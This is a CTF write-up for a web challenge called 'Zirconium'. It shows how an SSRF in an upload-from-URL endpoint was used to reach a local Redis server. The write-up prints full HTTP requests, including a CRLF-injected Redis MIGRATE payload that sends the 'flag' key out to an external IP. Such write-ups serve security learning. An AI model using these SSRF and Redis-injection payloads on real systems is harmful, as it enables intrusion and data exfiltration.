# Zirconium

**Tags:** SSRF, REDIS, OOB

**Help links:** 
- https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf
- https://blog.csdn.net/qq_31481187/article/details/73315511#0x1-ssrf

## Description

The web app had methods for uploading files by sending a file and by sending a link on the file.

## Solution

The second method `/upload_from_url` had SSRF vulnerability

Request example:

```
POST /upload_from_url HTTP/1.1
Host: web-zirconium.ctfz.one
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------6763777581250035135507995344
Content-Length: 471
Origin: http://web-zirconium.ctfz.one
Connection: close
Referer: http://web-zirconium.ctfz.one/
Cookie: session=eyJ1c2VybmFtZSI6ImphY2sifQ.XeJl0w.6blTy3b36OuRefMkMCjIhvlTYhg
Upgrade-Insecure-Requests: 1

-----------------------------6763777581250035135507995344
Content-Disposition: form-data; name="url"

http://oob.server.som/
-----------------------------6763777581250035135507995344
Content-Disposition: form-data; name="filename"

jack
-----------------------------6763777581250035135507995344--
```

After we found the SSRF, we started looking for a local tcp ports.

There was 2 open ports: 8080, 6379 (Redis)

Redis had old version (Like 3.0.\*) and could get HTTP request.

SSRF in redis was blind! (We couldn't read answers) After trying to make a RCE with SLAVEOF, we realized that the SLAVEOF command is disabled. And after some searches we found the `KEY flag`, that we could send ourselves with the MIGRATE command.

To use MIGRATE command we used Redis multi-line syntaxys like this:

```
http://127.0.0.1
*8
$7
MIGRATE
$14
111.111.211.11
$4
1338
$0

$1
0
$4
5000
$4
KEYS
$4
flag
:6379/
```

The final request looks like:

```
POST /upload_from_url HTTP/1.1
Host: web-zirconium.ctfz.one
Content-Type: multipart/form-data; boundary=---------------------------6763777581250035135507995344
Content-Length: 471
Origin: http://web-zirconium.ctfz.one
Connection: close
Referer: http://web-zirconium.ctfz.one/
Cookie: session=eyJ1c2VybmFtZSI6ImphY2sifQ.XeJl0w.6blTy3b36OuRefMkMCjIhvlTYhg
Upgrade-Insecure-Requests: 1

-----------------------------6763777581250035135507995344
Content-Disposition: form-data; name="url"

http://127.0.0.1%0d%0a*8%0d%0a$7%0d%0aMIGRATE%0d%0a$14%0d%0a111.111.211.11%0d%0a$4%0d%0a1338%0d%0a$0%0d%0a%0d%0a$1%0d%0a0%0d%0a$4%0d%0a5000%0d%0a$4%0d%0aKEYS%0d%0a$4%0d%0aflag%0d%0a:6379/
-----------------------------6763777581250035135507995344
Content-Disposition: form-data; name="filename"

jack
-----------------------------6763777581250035135507995344--
```